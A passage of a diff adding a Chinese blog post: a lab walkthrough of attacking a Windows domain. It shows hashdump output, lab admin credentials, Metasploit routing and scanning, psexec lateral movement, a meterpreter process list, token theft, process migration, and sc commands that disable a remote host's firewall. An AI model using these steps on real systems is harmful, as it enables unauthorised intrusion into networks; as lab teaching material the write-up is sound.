        WHOAMIANONY.ORG  %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yv</span><br><span class="line">                                w.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5</span><br><span class="line">                                A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br></pre></td></tr></table></figure>
+<p>hashdump：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+<p>ipconfig：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ethernet adapter �������� 4:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::ec90:4e8e:f29f:ef78%23</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.93.20</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br></pre></td></tr></table></figure>
+<p>查看域管：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+<p>发现access denied。</p>
+<p>其实这里我们已经抓到了域管的账号密码了：<code>Administrator/Whoami2021</code></p>
+<p>先创个msf路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.93.0 255.255.255.0 3</span><br></pre></td></tr></table></figure>
+<p>这里得用meterpreter的进程来添加</p>
+<p>udp_probe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>发现93.1、93.20、93.30，其中93.20是自己</p>
+<img src="/posts/undefined/22.png" class title="awa">
+<p>尝试psexec：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass Whoami2021</span><br><span class="line">set smbdomain whoamianony</span><br><span class="line">set rhosts 192.168.93.1 192.168.93.30</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>这里很怪，93.1是没有445端口的。重启之后又变正常了，ip变回了40。30的psexec打不上去，但是40的可以：</p>
+<img src="/posts/undefined/23.png" class title="awa">
+<p>怀疑是防火墙的问题，此处我们要通过PC1 或者 PC2把域控的防火墙给关了，此时我们要从system改为administrator权限，pc2没有可用的进程迁移。</p>
+<p>查看pc1的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name        Arch  Session  User              Path</span><br><span class="line"> ---   ----  ----        ----  -------  ----              ----</span><br><span class="line"> 0     0     [System Pr</span><br><span class="line">             ocess]</span><br><span class="line"> 4     0     System      x64   0</span><br><span class="line"> 252   4     smss.exe    x64   0        NT AUTHORITY\SYS  \SystemRoot\Syste</span><br><span class="line">                                        TEM               m32\smss.exe</span><br><span class="line"> 332   492   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system</span><br><span class="line">             e                          AL SERVICE        32\svchost.exe</span><br><span class="line"> 336   328   csrss.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">                                        TEM               32\csrss.exe</span><br><span class="line"> 380   492   OfficeWeb.  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             exe                        TEM               eWeb.exe</span><br><span class="line"> 388   328   wininit.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\wininit.exe</span><br><span class="line"> 396   380   csrss.exe   x64   1        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">                                        TEM               32\csrss.exe</span><br><span class="line"> 432   380   winlogon.e  x64   1        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             xe                         TEM               32\winlogon.exe</span><br><span class="line"> 492   388   services.e  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             xe                         TEM               32\services.exe</span><br><span class="line"> 504   388   lsass.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">                                        TEM               32\lsass.exe</span><br><span class="line"> 512   388   lsm.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">                                        TEM               32\lsm.exe</span><br><span class="line"> 612   492   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\svchost.exe</span><br><span class="line"> 672   492   vmacthlp.e  x64   0        NT AUTHORITY\SYS  C:\Program Files\</span><br><span class="line">             xe                         TEM               VMware\VMware Too</span><br><span class="line">                                                          ls\vmacthlp.exe</span><br><span class="line"> 700   1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 720   492   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\system</span><br><span class="line">             e                          WORK SERVICE      32\svchost.exe</span><br><span class="line"> 732   700   cmd.exe     x86   0        NT AUTHORITY\SYS  C:\Windows\SysWOW</span><br><span class="line">                                        TEM               64\cmd.exe</span><br><span class="line"> 784   492   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\System</span><br><span class="line">             e                          AL SERVICE        32\svchost.exe</span><br><span class="line"> 840   2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 848   492   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System</span><br><span class="line">             e                          TEM               32\svchost.exe</span><br><span class="line"> 876   492   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\system</span><br><span class="line">             e                          WORK SERVICE      32\svchost.exe</span><br><span class="line"> 884   492   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\svchost.exe</span><br><span class="line"> 900   1116  OfficeNgin  x86   0        NT AUTHORITY\SYS  C:\MYOA\nginx\Off</span><br><span class="line">             x.exe                      TEM               iceNginx.exe</span><br><span class="line"> 908   2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 916   336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 1020  2544  iexplore.e  x86   1        WHOAMIANONY\Admi  C:\Program Files</span><br><span class="line">             xe                         nistrator         (x86)\Internet Ex</span><br><span class="line">                                                          plorer\iexplore.e</span><br><span class="line">                                                          xe</span><br><span class="line"> 1036  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 1116  380   OfficeNgin  x86   0        NT AUTHORITY\SYS  C:\MYOA\nginx\Off</span><br><span class="line">             x.exe                      TEM               iceNginx.exe</span><br><span class="line"> 1160  492   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System</span><br><span class="line">             e                          TEM               32\spoolsv.exe</span><br><span class="line"> 1200  492   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system</span><br><span class="line">             e                          AL SERVICE        32\svchost.exe</span><br><span class="line"> 1288  492   VGAuthServ  x64   0        NT AUTHORITY\SYS  C:\Program Files\</span><br><span class="line">             ice.exe                    TEM               VMware\VMware Too</span><br><span class="line">                                                          ls\VMware VGAuth\</span><br><span class="line">                                                          VGAuthService.exe</span><br><span class="line"> 1348  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1364  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1440  492   OfficeRedi  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             s.exe                      TEM               eRedis.exe</span><br><span class="line"> 1488  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1492  4504  powershell  x86   0        NT AUTHORITY\SYS  C:\Windows\SysWOW</span><br><span class="line">             .exe                       TEM               64\WindowsPowerSh</span><br><span class="line">                                                          ell\v1.0\powershe</span><br><span class="line">                                                          ll.exe</span><br><span class="line"> 1532  396   conhost.ex  x64   1        WHOAMIANONY\bunn  C:\Windows\system</span><br><span class="line">             e                          y                 32\conhost.exe</span><br><span class="line"> 1540  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 1552  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1560  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1568  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1576  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1608  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1728  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1736  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1744  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1752  1992  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1780  1560  cmd.exe     x86   0        NT AUTHORITY\SYS  C:\Windows\SysWOW</span><br><span class="line">                                        TEM               64\cmd.exe</span><br><span class="line"> 1808  492   OfficeDbPr  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             oxy.exe                    TEM               eDbProxy.exe</span><br><span class="line"> 1824  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 1828  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 1992  380   OfficeFPM.  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             exe                        TEM               eFPM.exe</span><br><span class="line"> 2004  380   OfficeFPM.  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             exe                        TEM               eFPM.exe</span><br><span class="line"> 2016  492   vmtoolsd.e  x64   0        NT AUTHORITY\SYS  C:\Program Files\</span><br><span class="line">             xe                         TEM               VMware\VMware Too</span><br><span class="line">                                                          ls\vmtoolsd.exe</span><br><span class="line"> 2092  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2192  492   SearchInde  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             xer.exe                    TEM               32\SearchIndexer.</span><br><span class="line">                                                          exe</span><br><span class="line"> 2208  612   WmiPrvSE.e  x64   0        NT AUTHORITY\NET  C:\Windows\system</span><br><span class="line">             xe                         WORK SERVICE      32\wbem\wmiprvse.</span><br><span class="line">                                                          exe</span><br><span class="line"> 2368  492   msdtc.exe   x64   0        NT AUTHORITY\NET  C:\Windows\System</span><br><span class="line">                                        WORK SERVICE      32\msdtc.exe</span><br><span class="line"> 2436  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2468  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2476  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2484  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2492  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2500  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2508  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2516  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2532  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2540  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2544  3308  iexplore.e  x86   1        WHOAMIANONY\Admi  C:\Program Files</span><br><span class="line">             xe                         nistrator         (x86)\Internet Ex</span><br><span class="line">                                                          plorer\iexplore.e</span><br><span class="line">                                                          xe</span><br><span class="line"> 2640  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2656  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2672  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2688  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2704  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 2720  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 2968  492   OfficeTask  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             .exe                       TEM               eTask.exe</span><br><span class="line"> 2988  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 3040  492   dllhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\dllhost.exe</span><br><span class="line"> 3204  492   mysqld.exe  x64   0        NT AUTHORITY\SYS  C:\MYOA\mysql5\bi</span><br><span class="line">                                        TEM               n\mysqld.exe</span><br><span class="line"> 3208  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 3324  492   sppsvc.exe  x64   0        NT AUTHORITY\NET  C:\Windows\system</span><br><span class="line">                                        WORK SERVICE      32\sppsvc.exe</span><br><span class="line"> 3368  492   taskhost.e  x64   1        WHOAMIANONY\bunn  C:\Windows\system</span><br><span class="line">             xe                         y                 32\taskhost.exe</span><br><span class="line"> 3432  1440  redis-serv  x64   0        NT AUTHORITY\SYS  C:\MYOA\bin\redis</span><br><span class="line">             er64.exe                   TEM               -server64.exe</span><br><span class="line"> 3460  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 3484  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 3496  3768  cmd.exe     x64   1        WHOAMIANONY\bunn  C:\Windows\system</span><br><span class="line">                                        y                 32\cmd.exe</span><br><span class="line"> 3580  492   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System</span><br><span class="line">             e                          TEM               32\svchost.exe</span><br><span class="line"> 3744  848   dwm.exe     x64   1        WHOAMIANONY\bunn  C:\Windows\system</span><br><span class="line">                                        y                 32\Dwm.exe</span><br><span class="line"> 3768  3736  explorer.e  x64   1        WHOAMIANONY\bunn  C:\Windows\Explor</span><br><span class="line">             xe                         y                 er.EXE</span><br><span class="line"> 3840  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 3856  3768  vmtoolsd.e  x64   1        WHOAMIANONY\bunn  C:\Program Files\</span><br><span class="line">             xe                         y                 VMware\VMware Too</span><br><span class="line">                                                          ls\vmtoolsd.exe</span><br><span class="line"> 3872  492   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\system</span><br><span class="line">             e                          WORK SERVICE      32\svchost.exe</span><br><span class="line"> 3996  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 4048  2004  php-cgi.ex  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\php-c</span><br><span class="line">             e                          TEM               gi.exe</span><br><span class="line"> 4164  492   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system</span><br><span class="line">             e                          AL SERVICE        32\svchost.exe</span><br><span class="line"> 4192  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 4196  492   OfficeIm.e  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             xe                         TEM               eIm.exe</span><br><span class="line"> 4300  492   OfficeMail  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             .exe                       TEM               eMail.exe</span><br><span class="line"> 4376  492   OfficeInde  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             x.exe                      TEM               eIndex.exe</span><br><span class="line"> 4436  492   OfficePOP3  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             .exe                       TEM               ePop3.exe</span><br><span class="line"> 4504  1348  cmd.exe     x86   0        NT AUTHORITY\SYS  C:\Windows\SysWOW</span><br><span class="line">                                        TEM               64\cmd.exe</span><br><span class="line"> 4536  492   OfficeMQ.e  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             xe                         TEM               eMQ.exe</span><br><span class="line"> 4576  4536  OfficeWork  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             er.exe                     TEM               eWorker.exe</span><br><span class="line"> 4584  336   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             e                          TEM               32\conhost.exe</span><br><span class="line"> 4616  4748  powershell  x64   0        NT AUTHORITY\SYS  C:\Windows\system</span><br><span class="line">             .exe                       TEM               32\WindowsPowerSh</span><br><span class="line">                                                          ell\v1.0\powershe</span><br><span class="line">                                                          ll.exe</span><br><span class="line"> 4652  492   OfficeDaem  x86   0        NT AUTHORITY\SYS  C:\MYOA\bin\Offic</span><br><span class="line">             on.exe                     TEM               eDaemon.exe</span><br><span class="line"> 4748  1780  powershell  x86   0        NT AUTHORITY\SYS  C:\Windows\SysWOW</span><br><span class="line">             .exe                       TEM               64\WindowsPowerSh</span><br><span class="line">                                                          ell\v1.0\powershe</span><br><span class="line">                                                          ll.exe</span><br><span class="line"> 4900  732   powershell  x86   0        NT AUTHORITY\SYS  C:\Windows\SysWOW</span><br><span class="line">             .exe                       TEM               64\WindowsPowerSh</span><br><span class="line">                                                          ell\v1.0\powershe</span><br><span class="line">                                                          ll.exe</span><br></pre></td></tr></table></figure>
+<p>发现进程1020是administrator的，直接窃取令牌，但是无法创建进程，还是system权限</p>
+<img src="/posts/undefined/24.png" class title="awa">
+<img src="/posts/undefined/25.png" class title="awa">
+<p>但是可以直接迁移进程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 1020</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/26.png" class title="awa">
+<p>这里学习了一手用sc关防火墙：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.93.30 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.93.30 start unablefirewall</span><br></pre></td></tr></table></figure>
+<p>这里的提示虽然都是失败，但其实防火墙已经被关掉了</p>
+<img src="/posts/undefined/27.png" class title="awa">
+<p>psexec：</p>
+<img src="/posts/undefined/28.png" class title="awa">
+<p>最后拿下。</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
